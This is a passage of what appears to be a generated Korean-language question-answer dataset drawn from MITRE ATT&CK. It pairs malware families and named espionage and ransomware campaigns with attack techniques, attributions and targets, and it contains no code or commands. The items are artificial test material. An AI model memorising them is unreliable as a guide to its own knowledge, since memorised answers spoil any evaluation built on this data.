      "answer": "GeminiDuke는 Web Protocols, System Service Discovery, System Network Configuration Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "GeminiDuke",
        "attack_patterns": [
          "Web Protocols",
          "System Service Discovery",
          "System Network Configuration Discovery",
          "Process Discovery",
          "Local Account",
          "File and Directory Discovery"
        ]
      }
    },
    {
      "question": "Havoc 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Havoc는 Spearphishing Link, Remote System Discovery, System Network Configuration Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Havoc",
        "attack_patterns": [
          "Spearphishing Link",
          "Remote System Discovery",
          "System Network Configuration Discovery",
          "Native API",
          "Data from Local System",
          "File Transfer Protocols",
          "Time Based Checks",
          "Dynamic-link Library Injection",
          "Account Discovery",
          "Internet Connection Discovery",
          "Lateral Tool Transfer",
          "File and Directory Discovery",
          "Ingress Tool Transfer",
          "Portable Executable Injection",
          "PowerShell",
          "Process Discovery",
          "System Information Discovery",
          "Web Protocols",
          "Token Impersonation/Theft",
          "Windows Command Shell",
          "Screen Capture",
          "Malicious Copy and Paste",
          "Symmetric Cryptography",
          "Inter-Process Communication",
          "Proxy",
          "System Owner/User Discovery"
        ]
      }
    },
    {
      "question": "CARROTBAT 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "CARROTBAT는 Encrypted/Encoded File, File Deletion, Ingress Tool Transfer 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "CARROTBAT",
        "attack_patterns": [
          "Encrypted/Encoded File",
          "File Deletion",
          "Ingress Tool Transfer",
          "Command Obfuscation",
          "Windows Command Shell",
          "System Information Discovery"
        ]
      }
    },
    {
      "question": "Matryoshka 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Matryoshka는 Scheduled Task, Rundll32, DNS 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Matryoshka",
        "attack_patterns": [
          "Scheduled Task",
          "Rundll32",
          "DNS",
          "Screen Capture",
          "Obfuscated Files or Information",
          "Credentials from Password Stores",
          "Dynamic-link Library Injection",
          "Registry Run Keys / Startup Folder",
          "Command and Scripting Interpreter",
          "Keylogging"
        ]
      }
    },
    {
      "question": "FrameworkPOS 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "FrameworkPOS는 Archive via Custom Method, Process Discovery, Local Data Staging 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "FrameworkPOS",
        "attack_patterns": [
          "Archive via Custom Method",
          "Process Discovery",
          "Local Data Staging",
          "Exfiltration Over Alternative Protocol",
          "Data from Local System"
        ]
      }
    },
    {
      "question": "GravityRAT 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "GravityRAT는 Windows Management Instrumentation, Non-Standard Port, Dynamic Data Exchange 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "GravityRAT",
        "attack_patterns": [
          "Windows Management Instrumentation",
          "Non-Standard Port",
          "Dynamic Data Exchange",
          "System Owner/User Discovery",
          "Windows Command Shell",
          "Data from Local System",
          "System Service Discovery",
          "File and Directory Discovery",
          "Scheduled Task",
          "System Checks",
          "Process Discovery",
          "Data from Removable Media",
          "Web Protocols",
          "Encrypted/Encoded File",
          "System Time Discovery",
          "System Network Connections Discovery",
          "System Network Configuration Discovery",
          "Indicator Removal from Tools",
          "System Information Discovery"
        ]
      }
    },
    {
      "question": "WEBC2 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "WEBC2는 Windows Command Shell, Ingress Tool Transfer, DLL 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "WEBC2",
        "attack_patterns": [
          "Windows Command Shell",
          "Ingress Tool Transfer",
          "DLL"
        ]
      }
    },
    {
      "question": "C0027 캠페인의 특징은 무엇인가?",
      "answer": "[C0027](https://attack.mitre.org/campaigns/C0027) was a financially-motivated campaign linked to [Scattered Spider](https://attack.mitre.org/groups/G1015) that targeted telecommunications and business process outsourcing (BPO) companies from at least June through December of 2022. During [C0027](https://attack.mitre.org/campaigns/C0027) [Scattered Spider](https://attack.mitre.org/groups/G1015) used various forms of social engineering, performed SIM swapping, and attempted to leverage access from victim environments to mobile carrier networks.(Citation: Crowdstrike TELCO BPO Campaign December 2022)\n 주요 공격 기법은 Spearphishing Voice, Proxy, Credentials 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--df74f7ad-b10d-431c-9f1d-a2bc18dadefa"
      }
    },
    {
      "question": "Operation Wocao 캠페인의 특징은 무엇인가?",
      "answer": "[Operation Wocao](https://attack.mitre.org/campaigns/C0014) was a cyber espionage campaign that targeted organizations around the world, including in Brazil, China, France, Germany, Italy, Mexico, Portugal, Spain, the United Kingdom, and the United States. The suspected China-based actors compromised government organizations and managed service providers, as well as aviation, construction, energy, finance, health care, insurance, offshore engineering, software development, and transportation companies.(Citation: FoxIT Wocao December 2019)\n\nSecurity researchers assessed the [Operation Wocao](https://attack.mitre.org/campaigns/C0014) actors used similar TTPs and tools as APT20, suggesting a possible overlap. [Operation Wocao](https://attack.mitre.org/campaigns/C0014) was named after an observed command line entry by one of the threat actors, possibly out of frustration from losing webshell access.(Citation: FoxIT Wocao December 2019) 주요 공격 기법은 Process Injection, Process Discovery, Local Storage Discovery 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--b03d5112-e23a-4ac8-add0-be7502d24eff"
      }
    },
    {
      "question": "APT41 DUST 캠페인의 특징은 무엇인가?",
      "answer": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) was conducted by [APT41](https://attack.mitre.org/groups/G0096) from 2023 to July 2024 against entities in Europe, Asia, and the Middle East. [APT41 DUST](https://attack.mitre.org/campaigns/C0040) targeted sectors such as shipping, logistics, and media for information gathering purposes. [APT41](https://attack.mitre.org/groups/G0096) used previously-observed malware such as [DUSTPAN](https://attack.mitre.org/software/S1158) as well as newly observed tools such as [DUSTTRAP](https://attack.mitre.org/software/S1159) in [APT41 DUST](https://attack.mitre.org/campaigns/C0040).(Citation: Google Cloud APT41 2024) 이 캠페인은 DUSTPAN, Cobalt Strike, DUSTTRAP 등의 악성코드를 사용한다. 주요 공격 기법은 Code Signing, Asymmetric Cryptography, Serverless 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--add4d9de-1256-4166-83b8-57087288dced"
      }
    },
    {
      "question": "FunnyDream 캠페인의 특징은 무엇인가?",
      "answer": "[FunnyDream](https://attack.mitre.org/campaigns/C0007) was a suspected Chinese cyber espionage campaign that targeted government and foreign organizations in Malaysia, the Philippines, Taiwan, Vietnam, and other parts of Southeast Asia. Security researchers linked the [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign to possible Chinese-speaking threat actors through the use of the [Chinoxy](https://attack.mitre.org/software/S1041) backdoor and noted infrastructure overlap with the TAG-16 threat group.(Citation: Bitdefender FunnyDream Campaign November 2020)(Citation: Kaspersky APT Trends Q1 2020)(Citation: Recorded Future Chinese Activity in Southeast Asia December 2021) 이 캠페인은 Chinoxy, FunnyDream, ccf32 등의 악성코드를 사용한다. 주요 공격 기법은 System Information Discovery, Tool, Windows Management Instrumentation 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--8d2bc130-89fe-466e-a4f9-6bce6129c2b8"
      }
    },
    {
      "question": "ArcaneDoor 캠페인의 특징은 무엇인가?",
      "answer": "[ArcaneDoor](https://attack.mitre.org/campaigns/C0046) is a campaign targeting networking devices from Cisco and other vendors between July 2023 and April 2024, primarily focused on government and critical infrastructure networks. [ArcaneDoor](https://attack.mitre.org/campaigns/C0046) is associated with the deployment of the custom backdoors [Line Runner](https://attack.mitre.org/software/S1188) and [Line Dancer](https://attack.mitre.org/software/S1186). [ArcaneDoor](https://attack.mitre.org/campaigns/C0046) is attributed to a group referred to as UAT4356 or STORM-1849, and is assessed to be a state-sponsored campaign.(Citation: Cisco ArcaneDoor 2024)(Citation: CCCS ArcaneDoor 2024) 이 캠페인은 Line Dancer, Line Runner 등의 악성코드를 사용한다. 주요 공격 기법은 Deobfuscate/Decode Files or Information, Process Injection, External Remote Services 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--a543ef15-91ea-4aa9-9c10-267d56e1ee82"
      }
    },
    {
      "question": "SolarWinds Compromise 캠페인의 특징은 무엇인가?",
      "answer": "The [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024) was a sophisticated supply chain cyber operation conducted by [APT29](https://attack.mitre.org/groups/G0016) that was discovered in mid-December 2020. [APT29](https://attack.mitre.org/groups/G0016) used customized malware to inject malicious code into the SolarWinds Orion software build process that was later distributed through a normal software update; they also used password spraying, token theft, API abuse, spear phishing, and other supply chain attacks to compromise user accounts and leverage their associated access. Victims of this campaign included government, consulting, technology, telecom, and other organizations in North America, Europe, Asia, and the Middle East. This activity has been labled the StellarParticle campaign in industry reporting.(Citation: CrowdStrike StellarParticle January 2022) Industry reporting also initially referred to the actors involved in this campaign as UNC2452, NOBELIUM, Dark Halo, and SolarStorm.(Citation: SolarWinds Advisory Dec 2020)(Citation: SolarWinds Sunburst Sunspot Update January 2021)(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Volexity SolarWinds)(Citation: CrowdStrike StellarParticle January 2022)(Citation: Unit 42 SolarStorm December 2020)(Citation: Microsoft Analyzing Solorigate Dec 2020)(Citation: Microsoft Internal Solorigate Investigation Blog) \n\nIn April 2021, the US and UK governments attributed the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024) to Russia's Foreign Intelligence Service (SVR); public statements included citations to [APT29](https://attack.mitre.org/groups/G0016), Cozy Bear, and The Dukes.(Citation: NSA Joint Advisory SVR SolarWinds April 2021)(Citation: UK NSCS Russia SolarWinds April 2021)(Citation: Mandiant UNC2452 APT29 April 2022) The US government assessed that of the approximately 18,000 affected public and private sector customers of Solar Winds’ Orion product, a much smaller number were compromised by follow-on [APT29](https://attack.mitre.org/groups/G0016) activity on their systems.(Citation: USG Joint Statement SolarWinds January 2021)  이 캠페인은 Raindrop, SUNBURST, Cobalt Strike 등의 악성코드를 사용한다. 주요 공격 기법은 Web Session Cookie, Web Protocols, Exfiltration Over Asymmetric Encrypted Non-C2 Protocol 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--808d6b30-df4e-4341-8248-724da4bac650"
      }
    },
    {
      "question": "C0010 캠페인의 특징은 무엇인가?",
      "answer": "[C0010](https://attack.mitre.org/campaigns/C0010) was a cyber espionage campaign conducted by UNC3890 that targeted Israeli shipping, government, aviation, energy, and healthcare organizations. Security researcher assess UNC3890 conducts operations in support of Iranian interests, and noted several limited technical connections to Iran, including PDB strings and Farsi language artifacts. [C0010](https://attack.mitre.org/campaigns/C0010) began by at least late 2020, and was still ongoing as of mid-2022.(Citation: Mandiant UNC3890 Aug 2022) 이 캠페인은 SUGARUSH, SUGARDUMP 등의 악성코드를 사용한다. 주요 공격 기법은 Tool, Ingress Tool Transfer, Upload Tool 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--ab747e62-1bcb-479f-a26b-1cd39d413d81"
      }
    },
    {
      "question": "Operation CuckooBees 캠페인의 특징은 무엇인가?",
      "answer": "[Operation CuckooBees](https://attack.mitre.org/campaigns/C0012) was a cyber espionage campaign targeting technology and manufacturing companies in East Asia, Western Europe, and North America since at least 2019. Security researchers noted the goal of [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), which was still ongoing as of May 2022, was likely the theft of proprietary information, research and development documents, source code, and blueprints for various technologies. Researchers assessed [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012) was conducted by actors affiliated with [Winnti Group](https://attack.mitre.org/groups/G0044), [APT41](https://attack.mitre.org/groups/G0096), and BARIUM.(Citation: Cybereason OperationCuckooBees May 2022) 주요 공격 기법은 System Service Discovery, Kernel Modules and Extensions, Data from Local System 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--93c23946-49af-41f4-ac03-40f9ffc7419b"
      }
    },
    {
      "question": "Juicy Mix 캠페인의 특징은 무엇인가?",
      "answer": "[Juicy Mix](https://attack.mitre.org/campaigns/C0044) was a campaign conducted by [OilRig](https://attack.mitre.org/groups/G0049) throughout 2022 that targeted Israeli organizations with the [Mango](https://attack.mitre.org/software/S1169) backdoor.(Citation: ESET OilRig Campaigns Sep 2023) 이 캠페인은 Mango 등의 악성코드를 사용한다. 주요 공격 기법은 Credentials from Web Browsers, Server, Windows Credential Manager 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--7ab2f1a1-26af-4204-ad84-d640fde391da"
      }
    },
    {
      "question": "CostaRicto 캠페인의 특징은 무엇인가?",
      "answer": "[CostaRicto](https://attack.mitre.org/campaigns/C0004) was a suspected hacker-for-hire cyber espionage campaign that targeted multiple industries worldwide, with a large number being financial institutions. [CostaRicto](https://attack.mitre.org/campaigns/C0004) actors targeted organizations in Europe, the Americas, Asia, Australia, and Africa, with a large concentration in South Asia (especially India, Bangladesh, and Singapore), using custom malware, open source tools, and a complex network of proxies and SSH tunnels.(Citation: BlackBerry CostaRicto November 2020) 이 캠페인은 PS1, CostaBricks, SombRAT 등의 악성코드를 사용한다. 주요 공격 기법은 Protocol Tunneling, Data from Local System, Malware 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--f9cc545e-b0ef-4b92-8884-a3a4427609f6"
      }
    },
    {
      "question": "Operation Honeybee 캠페인의 특징은 무엇인가?",
      "answer": "[Operation Honeybee](https://attack.mitre.org/campaigns/C0006) was a campaign that targeted humanitarian aid and inter-Korean affairs organizations from at least late 2017 through early 2018. [Operation Honeybee](https://attack.mitre.org/campaigns/C0006) initially targeted South Korea, but expanded to include Vietnam, Singapore, Japan, Indonesia, Argentina, and Canada. Security researchers assessed the threat actors were likely Korean speakers based on metadata used in both lure documents and executables, and named the campaign \"Honeybee\" after the author name discovered in malicious Word documents.(Citation: McAfee Honeybee)  이 캠페인은 SYSCON 등의 악성코드를 사용한다. 주요 공격 기법은 Masquerading, Deobfuscate/Decode Files or Information, Process Discovery 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--4553292d-12c6-4a93-934d-12160370d4e0"
      }
    },
    {
      "question": "2016 Ukraine Electric Power Attack 캠페인의 특징은 무엇인가?",
      "answer": "[2016 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0025) was a [Sandworm Team](https://attack.mitre.org/groups/G0034) campaign during which they used [Industroyer](https://attack.mitre.org/software/S0604) malware to target and disrupt distribution substations within the Ukrainian power grid. This campaign was the second major public attack conducted against Ukraine by [Sandworm Team](https://attack.mitre.org/groups/G0034).(Citation: ESET Industroyer)(Citation: Dragos Crashoverride 2018) 이 캠페인은 Industroyer 등의 악성코드를 사용한다. 주요 공격 기법은 SMB/Windows Admin Shares, Compromise Host Software Binary, Disable Windows Event Logging 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--aa73efef-1418-4dbe-b43c-87a498e97234"
      }
    },
    {
      "question": "RedDelta Modified PlugX Infection Chain Operations 캠페인의 특징은 무엇인가?",
      "answer": "[RedDelta Modified PlugX Infection Chain Operations](https://attack.mitre.org/campaigns/C0047) was executed by [Mustang Panda](https://attack.mitre.org/groups/G0129) from mid-2023 through the end of 2024 against multiple entities in East and Southeast Asia. [RedDelta Modified PlugX Infection Chain Operations](https://attack.mitre.org/campaigns/C0047) involved phishing to deliver malicious files or links to users prompting follow-on installer downloads to load [PlugX](https://attack.mitre.org/software/S0013) on victim machines in a persistent state.(Citation: Recorded Future RedDelta 2025) 이 캠페인은 PlugX, ShadowPad 등의 악성코드를 사용한다. 주요 공격 기법은 Malicious Link, MMC, Domains 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--276671b5-5425-48db-ad65-c8c2564a969b"
      }
    },
    {
      "question": "2015 Ukraine Electric Power Attack 캠페인의 특징은 무엇인가?",
      "answer": "[2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028) was a [Sandworm Team](https://attack.mitre.org/groups/G0034) campaign during which they used [BlackEnergy](https://attack.mitre.org/software/S0089) (specifically BlackEnergy3) and [KillDisk](https://attack.mitre.org/software/S0607) to target and disrupt transmission and distribution substations within the Ukrainian power grid. This campaign was the first major public attack conducted against the Ukrainian power grid by Sandworm Team. 이 캠페인은 BlackEnergy, KillDisk 등의 악성코드를 사용한다. 주요 공격 기법은 Disable or Modify Tools, Process Injection, Keylogging 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--46421788-b6e1-4256-b351-f8beffd1afba"
      }
    },
    {
      "question": "C0018 캠페인의 특징은 무엇인가?",
      "answer": "\n[C0018](https://attack.mitre.org/campaigns/C0018) was a month-long ransomware intrusion that successfully deployed [AvosLocker](https://attack.mitre.org/software/S1053) onto a compromised network. The unidentified actors gained initial access to the victim network through an exposed server and used a variety of open-source tools prior to executing [AvosLocker](https://attack.mitre.org/software/S1053).(Citation: Costa AvosLocker May 2022)(Citation: Cisco Talos Avos Jun 2022) 이 캠페인은 Cobalt Strike, AvosLocker 등의 악성코드를 사용한다. 주요 공격 기법은 Rundll32, Windows Management Instrumentation, Masquerading 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--519ee082-8ab6-439b-988f-a8a3f02c8d30"
      }
    },
    {
      "question": "Operation Dust Storm 캠페인의 특징은 무엇인가?",
      "answer": "[Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) was a long-standing persistent cyber espionage campaign that targeted multiple industries in Japan, South Korea, the United States, Europe, and several Southeast Asian countries. By 2015, the [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) threat actors shifted from government and defense-related intelligence targets to Japanese companies or Japanese subdivisions of larger foreign organizations supporting Japan's critical infrastructure, including electricity generation, oil and natural gas, finance, transportation, and construction.(Citation: Cylance Dust Storm)\n\n[Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) threat actors also began to use Android backdoors in their operations by 2015, with all identified victims at the time residing in Japan or South Korea.(Citation: Cylance Dust Storm) 이 캠페인은 S-Type, ZLib, Mis-Type 등의 악성코드를 사용한다. 주요 공격 기법은 Spearphishing Link, Deobfuscate/Decode Files or Information, Email Accounts 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--4603cf2f-06d0-4970-9c5d-5071b08c817f"
      }
    },
    {
      "question": "Operation Dream Job 캠페인의 특징은 무엇인가?",
      "answer": "[Operation Dream Job](https://attack.mitre.org/campaigns/C0022) was a cyber espionage operation likely conducted by [Lazarus Group](https://attack.mitre.org/groups/G0032) that targeted the defense, aerospace, government, and other sectors in the United States, Israel, Australia, Russia, and India. In at least one case, the cyber actors tried to monetize their network access to conduct a business email compromise (BEC) operation. In 2020, security researchers noted overlapping TTPs, to include fake job lures and code similarities, between [Operation Dream Job](https://attack.mitre.org/campaigns/C0022), Operation North Star, and Operation Interception; by 2022 security researchers described [Operation Dream Job](https://attack.mitre.org/campaigns/C0022) as an umbrella term covering both Operation Interception and Operation North Star.(Citation: ClearSky Lazarus Aug 2020)(Citation: McAfee Lazarus Jul 2020)(Citation: ESET Lazarus Jun 2020)(Citation: The Hacker News Lazarus Aug 2022) 이 캠페인은 DRATzarus, Torisma 등의 악성코드를 사용한다. 주요 공격 기법은 XSL Script Processing, Archive via Utility, Social Media 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--0257b35b-93ef-4a70-80dd-ad5258e6045b"
      }
    },
    {
      "question": "FLORAHOX Activity 캠페인의 특징은 무엇인가?",
      "answer": "[FLORAHOX Activity](https://attack.mitre.org/campaigns/C0053) is conducted using a hybrid operational relay box (ORB) network, which combines two types of infrastructure: compromised devices and leased Virtual Private Servers (VPS). The compromised devices include end-of-life routers and IoT devices, while VPS space is commercially leased and managed by ORB network administrators. This hybrid ORB network allows adversaries to proxy and obscure malicious traffic, making the source of the traffic more difficult to trace.\n\nThe FLORAHOX ORB network has been leveraged by multiple cyber threat actors, including China-nexus actors like [ZIRCONIUM](https://attack.mitre.org/groups/G0128). These adversaries conduct espionage campaigns through [FLORAHOX Activity](https://attack.mitre.org/campaigns/C0053), relying on the ORB network's ability to funnel traffic through [Tor](https://attack.mitre.org/software/S0183) nodes, provisioned VPS servers, and compromised routers to obfuscate malicious traffic.(Citation: ORB Mandiant) 주요 공격 기법은 Exploit Public-Facing Application, Command and Scripting Interpreter, Multi-hop Proxy 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--f494272a-c110-4574-be90-42c4957f7ae7"
      }
    },
    {
      "question": "C0015 캠페인의 특징은 무엇인가?",
      "answer": "[C0015](https://attack.mitre.org/campaigns/C0015) was a ransomware intrusion during which the unidentified attackers used [Bazar](https://attack.mitre.org/software/S0534), [Cobalt Strike](https://attack.mitre.org/software/S0154), and [Conti](https://attack.mitre.org/software/S0575), along with other tools, over a 5 day period. Security researchers assessed the actors likely used the widely-circulated [Conti](https://attack.mitre.org/software/S0575) ransomware playbook based on the observed pattern of activity and operator errors.(Citation: DFIR Conti Bazar Nov 2021) 이 캠페인은 Bazar, Conti, Cobalt Strike 등의 악성코드를 사용한다. 주요 공격 기법은 Domain Trust Discovery, Mshta, Masquerading 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--78068e68-4124-4243-b6f4-76e4e5be8a06"
      }
    },
    {
      "question": "RedPenguin 캠페인의 특징은 무엇인가?",
      "answer": "The [RedPenguin](https://attack.mitre.org/campaigns/C0056) project was launched by Juniper in July 2024 to investigate reported malware infections of Juniper MX Series routers. [RedPenguin](https://attack.mitre.org/campaigns/C0056) activity was separately attributed to [UNC3886](https://attack.mitre.org/groups/G1048) and included the deployment of multiple custom versions of the publicly-available TINYSHELL backdoor on Juniper routers.(Citation: Juniper RedPenguin MAR 2025)(Citation: Mandiant UNC3886 Juniper Routers MAR 2025) 이 캠페인은 MEDUSA, REPTILE 등의 악성코드를 사용한다. 주요 공격 기법은 Rootkit, Exfiltration Over C2 Channel, File Deletion 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--35879bf3-0a21-4cc1-9e42-6de917a22501"
      }
    },
    {
      "question": "Versa Director Zero Day Exploitation 캠페인의 특징은 무엇인가?",
      "answer": "[Versa Director Zero Day Exploitation](https://attack.mitre.org/campaigns/C0039) was conducted by [Volt Typhoon](https://attack.mitre.org/groups/G1017) from early June through August 2024 as zero-day exploitation of Versa Director servers controlling software-defined wide area network (SD-WAN) applications. Since tracked as CVE-2024-39717, exploitation focused on credential capture from compromised Versa Director servers at managed service providers (MSPs) and internet service providers (ISPs) to enable follow-on access to service provider clients. [Versa Director Zero Day Exploitation](https://attack.mitre.org/campaigns/C0039) was followed by the delivery of the [VersaMem](https://attack.mitre.org/software/S1154) web shell for both credential theft and follow-on code execution.(Citation: Lumen Versa 2024) 이 캠페인은 VersaMem 등의 악성코드를 사용한다. 주요 공격 기법은 Web Shell, Non-Application Layer Protocol, Malware 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--af0ec65a-caa9-40ef-b1c7-21b71fbf3a10"
      }
    },
    {
      "question": "C0021 캠페인의 특징은 무엇인가?",
      "answer": "[C0021](https://attack.mitre.org/campaigns/C0021) was a spearphishing campaign conducted in November 2018 that targeted public sector institutions, non-governmental organizations (NGOs), educational institutions, and private-sector corporations in the oil and gas, chemical, and hospitality industries. The majority of targets were located in the US, particularly in and around Washington D.C., with other targets located in Europe, Hong Kong, India, and Canada. [C0021](https://attack.mitre.org/campaigns/C0021)'s technical artifacts, tactics, techniques, and procedures (TTPs), and targeting overlap with previous suspected [APT29](https://attack.mitre.org/groups/G0016) activity.(Citation: Microsoft Unidentified Dec 2018)(Citation: FireEye APT29 Nov 2018) 이 캠페인은 Cobalt Strike 등의 악성코드를 사용한다. 주요 공격 기법은 Embedded Payloads, PowerShell, Asymmetric Cryptography 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--712e38c3-a656-426a-9b3b-a6bfb63294c6"
      }
    },
    {
      "question": "Frankenstein 캠페인의 특징은 무엇인가?",
      "answer": "[Frankenstein](https://attack.mitre.org/campaigns/C0001) was described by security researchers as a highly-targeted campaign conducted by moderately sophisticated and highly resourceful threat actors in early 2019. The unidentified actors primarily relied on open source tools, including [Empire](https://attack.mitre.org/software/S0363). The campaign name refers to the actors' ability to piece together several unrelated open-source tool components.(Citation: Talos Frankenstein June 2019) 주요 공격 기법은 System Owner/User Discovery, Symmetric Cryptography, Tool 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--26d9ebae-de59-427f-ae9a-349456bae4b1"
      }
    },
    {
      "question": "Outer Space 캠페인의 특징은 무엇인가?",
      "answer": "[Outer Space](https://attack.mitre.org/campaigns/C0042) was a campaign conducted by [OilRig](https://attack.mitre.org/groups/G0049) throughout 2021 that used the [SampleCheck5000](https://attack.mitre.org/software/S1168) downloader and [Solar](https://attack.mitre.org/software/S1166) backdoor to target Israeli organizations.(Citation: ESET OilRig Campaigns Sep 2023) 이 캠페인은 SampleCheck5000, Solar 등의 악성코드를 사용한다. 주요 공격 기법은 Visual Basic, Malware, Encrypted/Encoded File 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--a1f5df89-ec82-45ef-b229-4ca6a407dc4f"
      }
    },
    {
      "question": "APT28 Nearest Neighbor Campaign 캠페인의 특징은 무엇인가?",
      "answer": "[APT28 Nearest Neighbor Campaign](https://attack.mitre.org/campaigns/C0051) was conducted by [APT28](https://attack.mitre.org/groups/G0007) from early February 2022 to November 2024 against organizations and individuals with expertise on Ukraine. APT28 primarily leveraged living-off-the-land techniques, while leveraging the zero-day exploitation of CVE-2022-38028. Notably, APT28 leveraged Wi-Fi networks in close proximity to the intended target to gain initial access to the victim environment. By daisy-chaining multiple compromised organizations nearby the intended target, APT28 discovered dual-homed systems (with both a wired and wireless network connection) to enable Wi-Fi and use compromised credentials to connect to the victim network.(Citation: Nearest Neighbor Volexity) 주요 공격 기법은 Direct Volume Access, Internal Proxy, SMB/Windows Admin Shares 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--a010610e-22cb-437e-bfde-b78861bdca7a"
      }
    },
    {
      "question": "Night Dragon 캠페인의 특징은 무엇인가?",
      "answer": "[Night Dragon](https://attack.mitre.org/campaigns/C0002) was a cyber espionage campaign that targeted oil, energy, and petrochemical companies, along with individuals and executives in Kazakhstan, Taiwan, Greece, and the United States. The unidentified threat actors searched for information related to oil and gas field production systems, financials, and collected data from SCADA systems. Based on the observed techniques, tools, and network activities, security researchers assessed the campaign involved a threat group based in China.(Citation: McAfee Night Dragon) 이 캠페인은 zwShell, ASPXSpy 등의 악성코드를 사용한다. 주요 공격 기법은 Disable or Modify Tools, Remote Data Staging, Ingress Tool Transfer 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--ae407e32-87e0-4d92-8705-3ae25d504d8a"
      }
    },
    {
      "question": "Operation Ghost 캠페인의 특징은 무엇인가?",
      "answer": "[Operation Ghost](https://attack.mitre.org/campaigns/C0023) was an [APT29](https://attack.mitre.org/groups/G0016) campaign starting in 2013 that included operations against ministries of foreign affairs in Europe and the Washington, D.C. embassy of a European Union country. During [Operation Ghost](https://attack.mitre.org/campaigns/C0023), [APT29](https://attack.mitre.org/groups/G0016) used new families of malware and leveraged web services, steganography, and unique C2 infrastructure for each victim.(Citation: ESET Dukes October 2019)\n 이 캠페인은 PolyglotDuke, RegDuke, MiniDuke 등의 악성코드를 사용한다. 주요 공격 기법은 Steganography, Social Media Accounts, Windows Management Instrumentation Event Subscription 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--7854c1a0-f06c-4876-98a4-4bbd34751b05"
      }
    },
    {
      "question": "Indian Critical Infrastructure Intrusions 캠페인의 특징은 무엇인가?",
